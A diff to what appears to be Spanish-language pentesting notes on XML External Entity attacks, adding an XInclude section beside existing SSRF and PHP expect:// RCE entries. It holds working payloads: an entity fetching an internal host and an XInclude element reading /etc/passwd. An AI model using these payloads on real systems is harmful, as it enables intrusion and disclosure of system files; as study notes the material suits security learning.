@@ -26,6 +26,12 @@ Si el formulario es vulnerable mostrará el dato de la entidad, de no serlo most
 #########################SSRF
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 
+#########################XInclude
+
+De a ratos nos encontramos con sitios que al hacer una request nos piden datos que luego serán parseados en el back-
+end para agrergarse a un xml. ¿Cómo las distinguimos? No sabemos, simplemente hay que probar.
+Para hacer una xxe, reemplazamos el parámetro que se está enviando por:
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 
 ######## RCE:
 1)Si el módulo de php expect está instalado y permitido podríamos usar directamente: "expect://'comando'"
